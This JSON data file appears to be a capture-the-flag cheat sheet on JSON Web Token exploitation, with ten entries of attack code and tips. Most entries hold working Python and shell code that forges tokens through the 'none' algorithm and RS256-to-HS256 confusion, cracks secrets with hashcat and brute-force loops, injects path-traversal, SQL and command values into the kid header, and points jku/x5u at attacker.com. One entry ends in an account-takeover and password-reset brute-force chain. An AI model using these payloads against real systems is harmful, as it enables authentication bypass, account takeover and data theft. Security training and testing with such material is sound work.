{
  "title": "JWT Exploitation",
  "category": "Web",
  "description": "JSON Web Token vulnerabilities, signature bypass techniques, algorithm confusion attacks, and key cracking methods for authentication exploitation.",
  "entries": [
    {
      "name": "JWT Structure & Basics",
      "desc": "Understanding JWT format: header.payload.signature encoded in Base64URL",
      "example": "# JWT Structure\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\n# Decoding JWT\nimport base64\nimport json\n\ndef decode_jwt(token):\n    parts = token.split('.')\n    \n    # Decode header\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    print(f\"Header: {header}\")\n    \n    # Decode payload\n    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))\n    print(f\"Payload: {payload}\")\n    \n    # Signature (binary)\n    signature = parts[2]\n    print(f\"Signature: {signature}\")\n    \n    return header, payload, signature\n\n# Common header fields:\n# - alg: Algorithm (HS256, RS256, none, etc.)\n# - typ: Token type (JWT)\n# - kid: Key ID\n\n# Common payload fields:\n# - sub: Subject (user ID)\n# - iss: Issuer\n# - aud: Audience\n# - exp: Expiration time\n# - iat: Issued at\n# - role: User role (admin, user, etc.)",
      "flag_hint": "Always decode JWT first to understand structure and claims",
      "tags": ["jwt", "structure", "base64", "decoding"]
    },
    {
      "name": "Algorithm None Attack",
      "desc": "Bypass signature verification by setting algorithm to 'none'",
      "example": "# Original JWT with HS256\n# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIifQ.signature\n\nimport base64\nimport json\n\n# Modify algorithm to 'none'\nheader = {\n    \"alg\": \"none\",\n    \"typ\": \"JWT\"\n}\n\n# Modify payload (escalate privileges)\npayload = {\n    \"user\": \"bob\",\n    \"role\": \"admin\"  # Changed from 'user'\n}\n\n# Encode (no signature needed)\ndef base64url_encode(data):\n    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')\n\nheader_enc = base64url_encode(header)\npayload_enc = base64url_encode(payload)\n\n# Create JWT with no signature (note the trailing dot)\nforged_jwt = f\"{header_enc}.{payload_enc}.\"\n\n# Alternative: empty signature\nforged_jwt = f\"{header_enc}.{payload_enc}.\"\n\nprint(f\"Forged JWT: {forged_jwt}\")\n\n# Some implementations accept:\n# - alg: \"none\"\n# - alg: \"None\"\n# - alg: \"NONE\"\n# - alg: \"nOnE\"",
      "flag_hint": "Try different capitalizations of 'none' - some validators are case-sensitive",
      "tags": ["jwt", "none-algorithm", "bypass", "signature"]
    },
    {
      "name": "Algorithm Confusion Attack",
      "desc": "Exploit RS256 to HS256 confusion - use public key as HMAC secret",
      "example": "# Vulnerability: Server accepts both RS256 and HS256\n# Attack: Change RS256 to HS256, sign with RSA public key\n\nimport jwt\nimport base64\n\n# Original JWT uses RS256 (asymmetric)\n# Server has:\n# - Private key: signs tokens\n# - Public key: verifies tokens\n\n# Attack steps:\n# 1. Obtain public key (often in JWKS endpoint)\npublic_key = \"\"\"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...\n-----END PUBLIC KEY-----\"\"\"\n\n# 2. Create malicious payload\npayload = {\n    \"user\": \"admin\",\n    \"role\": \"admin\"\n}\n\n# 3. Sign with HS256 using public key as secret\nforged_token = jwt.encode(payload, public_key, algorithm='HS256')\nprint(f\"Forged token: {forged_token}\")\n\n# Server verification (vulnerable):\n# Decodes header, sees \"HS256\"\n# Uses public key as HMAC secret (should reject!)\n# Token validates successfully\n\n# Alternative: Try different key formats\n# - PEM format\n# - DER format\n# - Raw modulus + exponent\n\n# Extract public key from certificate\n# openssl x509 -in cert.pem -pubkey -noout > public.pem",
      "flag_hint": "Look for JWKS endpoint at /.well-known/jwks.json or /jwks.json",
      "tags": ["jwt", "algorithm-confusion", "rs256", "hs256"]
    },
    {
      "name": "Weak Secret Bruteforce",
      "desc": "Crack weak HMAC secrets using dictionary attacks or bruteforce",
      "example": "# Using hashcat for JWT cracking\n# JWT hash mode: 16500\n\n# Save JWT to file\necho 'eyJhbGci....' > jwt.txt\n\n# Dictionary attack\nhashcat -m 16500 jwt.txt rockyou.txt\n\n# Mask attack (6 lowercase chars)\nhashcat -m 16500 jwt.txt -a 3 ?l?l?l?l?l?l\n\n# Using john the ripper\njohn jwt.txt --wordlist=rockyou.txt\n\n# Python bruteforce\nimport jwt\nimport itertools\nimport string\n\ntoken = \"eyJhbGci...\"\n\n# Try common secrets\ncommon_secrets = ['secret', 'password', '123456', 'admin', 'key', 'secret123']\n\nfor secret in common_secrets:\n    try:\n        decoded = jwt.decode(token, secret, algorithms=['HS256'])\n        print(f\"Found secret: {secret}\")\n        print(f\"Payload: {decoded}\")\n        break\n    except jwt.InvalidSignatureError:\n        continue\n\n# Bruteforce short secrets\nfor length in range(1, 6):\n    for attempt in itertools.product(string.ascii_lowercase, repeat=length):\n        secret = ''.join(attempt)\n        try:\n            decoded = jwt.decode(token, secret, algorithms=['HS256'])\n            print(f\"Found secret: {secret}\")\n            break\n        except:\n            continue",
      "flag_hint": "Start with common secrets: 'secret', 'key', application name, etc.",
      "tags": ["jwt", "bruteforce", "hashcat", "weak-secret"]
    },
    {
      "name": "Key ID (kid) Injection",
      "desc": "Exploit kid parameter for path traversal, SQL injection, or command injection",
      "example": "# Original JWT header\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\",\n  \"kid\": \"key1\"\n}\n\n# Server code (vulnerable):\n# key = open(f\"/keys/{kid}\").read()\n# jwt.verify(token, key)\n\n# Attack 1: Path traversal\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\",\n  \"kid\": \"../../../../etc/passwd\"\n}\n# Server reads /etc/passwd as key\n# Sign token with /etc/passwd content as secret\n\nimport jwt\nwith open('/etc/passwd', 'r') as f:\n    key = f.read()\n\npayload = {\"user\": \"admin\", \"role\": \"admin\"}\ntoken = jwt.encode(payload, key, algorithm='HS256', \n                   headers={\"kid\": \"../../../../etc/passwd\"})\n\n# Attack 2: SQL Injection\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\",\n  \"kid\": \"key1' UNION SELECT 'secret' -- -\"\n}\n# Server: SELECT key FROM keys WHERE id='$kid'\n# Returns known value 'secret'\n\n# Attack 3: Command injection\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\",\n  \"kid\": \"key1; echo secret\"\n}\n\n# Attack 4: Known file contents\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\",\n  \"kid\": \"/dev/null\"\n}\n# Sign with empty string as key\ntoken = jwt.encode(payload, '', algorithm='HS256', \n                   headers={\"kid\": \"/dev/null\"})",
      "flag_hint": "Try path traversal first, then SQL injection if kid is from database",
      "tags": ["jwt", "kid", "injection", "path-traversal"]
    },
    {
      "name": "JKU/X5U Header Injection",
      "desc": "Exploit JWK Set URL (jku) or X.509 URL (x5u) to use attacker-controlled keys",
      "example": "# JKU (JWK Set URL) header\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jku\": \"https://attacker.com/jwks.json\"\n}\n\n# Server fetches keys from attacker URL\n# Attacker provides their own key pair\n\n# Create attacker's JWKS\nfrom jwcrypto import jwk\nimport json\n\n# Generate RSA key pair\nkey = jwk.JWK.generate(kty='RSA', size=2048)\n\n# Export public key as JWKS\njwks = {\n    \"keys\": [\n        json.loads(key.export_public())\n    ]\n}\n\n# Host on attacker server\nwith open('jwks.json', 'w') as f:\n    json.dump(jwks, f)\n\n# Create forged JWT\nimport jwt\n\npayload = {\"user\": \"admin\", \"role\": \"admin\"}\nprivate_key = key.export_to_pem(private_key=True, password=None)\n\ntoken = jwt.encode(payload, private_key, algorithm='RS256',\n                   headers={\"jku\": \"https://attacker.com/jwks.json\"})\n\n# X5U (X.509 URL) attack - similar concept\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"x5u\": \"https://attacker.com/cert.pem\"\n}\n\n# Bypass attempts:\n# - Use DNS rebinding\n# - SSRF to internal endpoints\n# - Open redirect on trusted domain",
      "flag_hint": "Check if server validates jku/x5u URLs - try SSRF or open redirect",
      "tags": ["jwt", "jku", "x5u", "ssrf", "url-injection"]
    },
    {
      "name": "JWK Injection",
      "desc": "Embed malicious JWK (JSON Web Key) directly in JWT header",
      "example": "# Vulnerable JWT verification:\n# Trusts key embedded in header\n\nimport jwt\nfrom jwcrypto import jwk\nimport json\n\n# Generate attacker's key pair\nkey = jwk.JWK.generate(kty='RSA', size=2048)\n\n# Create payload\npayload = {\n    \"user\": \"admin\",\n    \"role\": \"admin\",\n    \"exp\": 9999999999\n}\n\n# Export keys\npublic_jwk = json.loads(key.export_public())\nprivate_pem = key.export_to_pem(private_key=True, password=None)\n\n# Create JWT with embedded public key\ntoken = jwt.encode(\n    payload,\n    private_pem,\n    algorithm='RS256',\n    headers={\n        \"alg\": \"RS256\",\n        \"typ\": \"JWT\",\n        \"jwk\": public_jwk\n    }\n)\n\nprint(f\"Forged token: {token}\")\n\n# Decoded header looks like:\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jwk\": {\n    \"kty\": \"RSA\",\n    \"n\": \"0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx...\",\n    \"e\": \"AQAB\"\n  }\n}\n\n# Server (vulnerable) trusts embedded key\n# jwt.verify(token, token.header.jwk)",
      "flag_hint": "If server accepts jwk header parameter, you can supply your own key",
      "tags": ["jwt", "jwk", "key-injection", "self-signed"]
    },
    {
      "name": "Expiration & Timing Attacks",
      "desc": "Exploit weak expiration validation or timing vulnerabilities",
      "example": "# Modify expiration claim\nimport jwt\nimport time\nimport json\nimport base64\n\n# Original token (expired)\ntoken = \"eyJhbGci...\"\n\n# Decode without verification\nparts = token.split('.')\nheader = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\npayload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))\n\nprint(f\"Original exp: {payload.get('exp')}\")\n\n# Modify expiration (far future)\npayload['exp'] = int(time.time()) + 31536000  # 1 year\n\n# If signature not checked:\ndef base64url_encode(data):\n    return base64.urlsafe_b64encode(\n        json.dumps(data).encode()\n    ).decode().rstrip('=')\n\nnew_payload = base64url_encode(payload)\nnew_token = f\"{parts[0]}.{new_payload}.{parts[2]}\"\n\n# Remove expiration claim entirely\ndel payload['exp']\nnew_payload = base64url_encode(payload)\nnew_token = f\"{parts[0]}.{new_payload}.{parts[2]}\"\n\n# Set negative expiration\npayload['exp'] = -1\n\n# Timing attack on signature verification\n# If verification is not constant-time:\nimport requests\nimport statistics\n\ndef timing_attack(url, token):\n    times = []\n    for _ in range(100):\n        start = time.time()\n        requests.get(url, headers={'Authorization': f'Bearer {token}'})\n        times.append(time.time() - start)\n    return statistics.mean(times)\n\n# Compare timing for different tokens\n# Longer time = more bytes matched",
      "flag_hint": "Try removing exp claim entirely or setting to very large value",
      "tags": ["jwt", "expiration", "timing-attack", "exp"]
    },
    {
      "name": "JWT Tools & Automation",
      "desc": "Essential tools for JWT analysis and exploitation",
      "example": "# jwt_tool - Comprehensive JWT testing\npython jwt_tool.py eyJhbGci...\n\n# Automated scanning\npython jwt_tool.py eyJhbGci... -M at\n\n# Crack secret\npython jwt_tool.py eyJhbGci... -C -d /path/to/wordlist.txt\n\n# Tamper payload\npython jwt_tool.py eyJhbGci... -T\n\n# jwt.io debugger (online)\n# Decode, verify, and create JWTs\n# jwt.io\n\n# Python library\nimport jwt\n\n# Decode without verification\ntoken = \"eyJhbGci...\"\ndecoded = jwt.decode(token, options={\"verify_signature\": False})\nprint(decoded)\n\n# Encode new token\ntoken = jwt.encode({\"user\": \"admin\"}, \"secret\", algorithm=\"HS256\")\n\n# Burp Suite extensions\n# - JSON Web Tokens\n# - JWT4B (JWT Fuzzer for Burp)\n\n# Testing checklist:\n# 1. Decode JWT (jwt.io)\n# 2. Try 'none' algorithm\n# 3. Try weak secrets (common passwords)\n# 4. Check for kid/jku/x5u injection\n# 5. Try algorithm confusion (RS256->HS256)\n# 6. Modify payload (privilege escalation)\n# 7. Test expiration handling\n# 8. Check key rotation\n\n# JWKS endpoints to check:\n# /.well-known/jwks.json\n# /jwks.json\n# /.well-known/openid-configuration\n# /api/jwks.json",
      "flag_hint": "Use jwt_tool for automated scanning - it tests all common vulnerabilities",
      "tags": ["jwt", "tools", "jwt_tool", "automation"]
    },
    {
      "name": "JWT to Account Takeover",
      "desc": "Exploit JWT vulnerabilities to gain unauthorized access to user accounts",
      "example": "# Scenario 1: Modify user ID in payload\n# Original token\npayload = {\n    \"user_id\": \"123\",\n    \"username\": \"bob\",\n    \"role\": \"user\"\n}\n\n# Attack: Change to target user\npayload['user_id'] = \"1\"  # Admin user ID\npayload['username'] = \"admin\"\npayload['role'] = \"admin\"\n\n# If signature not validated, full account takeover\n\n# Scenario 2: JWT in password reset\n# Token sent to email for password reset\n# Intercept or bruteforce token\n# Reset any user's password\n\nimport requests\n\nfor user_id in range(1, 1000):\n    token = generate_reset_token(user_id)  # If predictable\n    r = requests.post('/reset-password', \n                     json={'token': token, 'new_password': 'hacked'})\n    if r.status_code == 200:\n        print(f\"Reset password for user {user_id}\")\n\n# Scenario 3: Session fixation via JWT\n# Create JWT with victim's user ID\n# Send crafted link with malicious JWT\n# Victim's session now controlled by attacker\n\n# Scenario 4: JWT in OAuth flow\n# Steal JWT from OAuth callback\n# Use to access victim's resources\n\n# Scenario 5: Long-lived tokens\n# If exp is far in future or not validated\n# Single compromised token = persistent access\n\n# Full exploitation chain\n# 1. Get valid JWT (register account)\n# 2. Identify vulnerability (none, weak secret, etc.)\n# 3. Forge JWT for admin account\n# 4. Access admin endpoints\n# 5. Extract sensitive data or create backdoor",
      "flag_hint": "Focus on changing user_id, role, or privilege fields in payload",
      "tags": ["jwt", "account-takeover", "privilege-escalation", "exploitation"]
    }
  ]
}
